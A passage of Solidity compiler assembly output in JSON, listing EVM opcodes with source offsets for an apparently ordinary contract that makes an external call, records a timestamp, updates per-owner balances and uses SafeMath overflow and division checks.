											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 920,
											"end": 948,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 920,
											"end": 948,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 920,
											"end": 948,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "tag",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 920,
											"end": 948,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 920,
											"end": 948,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1029,
											"name": "TIMESTAMP",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1023,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 1006,
											"end": 1029,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1029,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1029,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 1006,
											"end": 1029,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1125,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 1112,
											"end": 1124,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1098,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1099,
											"end": 1106,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1099,
											"end": 1106,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1099,
											"end": 1106,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1099,
											"end": 1106,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1099,
											"end": 1106,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1099,
											"end": 1106,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1099,
											"end": 1106,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1099,
											"end": 1106,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1099,
											"end": 1106,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1099,
											"end": 1106,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1099,
											"end": 1106,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1107,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1111,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 1075,
											"end": 1111,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1125,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1125,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1125,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1075,
											"end": 1125,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1075,
											"end": 1125,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1075,
											"end": 1125,
											"name": "tag",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 1075,
											"end": 1125,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1063,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1064,
											"end": 1071,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1064,
											"end": 1071,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1064,
											"end": 1071,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1064,
											"end": 1071,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 1064,
											"end": 1071,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1064,
											"end": 1071,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 1064,
											"end": 1071,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 1064,
											"end": 1071,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1064,
											"end": 1071,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 1064,
											"end": 1071,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1064,
											"end": 1071,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1040,
											"end": 1072,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1125,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1125,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1125,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 1040,
											"end": 1125,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 648,
											"end": 1133,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 501,
											"end": 591,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 575,
											"end": 583,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 565,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 565,
											"end": 572,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 565,
											"end": 583,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 565,
											"end": 583,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 565,
											"end": 583,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 565,
											"end": 583,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 501,
											"end": 591,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1286,
											"end": 1290,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1310,
											"end": 1331,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 1303,
											"end": 1331,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1303,
											"end": 1331,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1238,
											"end": 1339,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 367,
											"end": 372,
											"name": "PUSH",
											"source": 0,
											"value": "A9E"
										},
										{
											"begin": 319,
											"end": 373,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 319,
											"end": 373,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 234,
											"end": 256,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 234,
											"end": 256,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 3101,
											"end": 3231,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 3101,
											"end": 3231,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3159,
											"end": 3166,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 3189,
											"end": 3190,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3192,
											"end": 3193,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "PUSH",
											"source": 2,
											"value": "1A"
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "PUSH",
											"source": 2,
											"value": "536166654D6174683A206469766973696F6E206279207A65726F000000000000"
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3185,
											"end": 3188,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "tag",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 3185,
											"end": 3224,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3178,
											"end": 3224,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3178,
											"end": 3224,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3101,
											"end": 3231,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 3101,
											"end": 3231,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3101,
											"end": 3231,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3101,
											"end": 3231,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3101,
											"end": 3231,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 874,
											"end": 1050,
											"name": "tag",
											"source": 2,
											"value": "35"
										},
										{
											"begin": 874,
											"end": 1050,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 932,
											"end": 939,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 951,
											"end": 960,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 967,
											"end": 968,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 963,
											"end": 964,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 963,
											"end": 968,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 951,
											"end": 968,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 951,
											"end": 968,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 991,
											"end": 992,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 986,
											"end": 987,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 986,
											"end": 992,
											"name": "LT",
											"source": 2
										},
										{
											"begin": 986,
											"end": 992,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "PUSH",
											"source": 2,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "PUSH",
											"source": 2,
											"value": "1B"
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "PUSH",
											"source": 2,
											"value": "536166654D6174683A206164646974696F6E206F766572666C6F770000000000"
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "tag",
											"source": 2,
											"value": "42"
										},
										{
											"begin": 978,
											"end": 1024,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1042,
											"end": 1043,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 1035,
											"end": 1043,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1035,
											"end": 1043,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1035,
											"end": 1043,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 874,
											"end": 1050,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 874,
											"end": 1050,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 874,
											"end": 1050,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 874,
											"end": 1050,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 874,
											"end": 1050,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 3713,
											"end": 3985,
											"name": "tag",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 3713,
											"end": 3985,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3799,
											"end": 3806,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3830,
											"end": 3831,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3826,
											"end": 3827,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3826,
											"end": 3831,
											"name": "GT",
											"source": 2
										},
										{
											"begin": 3833,
											"end": 3845,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "tag",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "LT",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3818,
											"end": 3846,
											"name": "POP",
											"source": 2
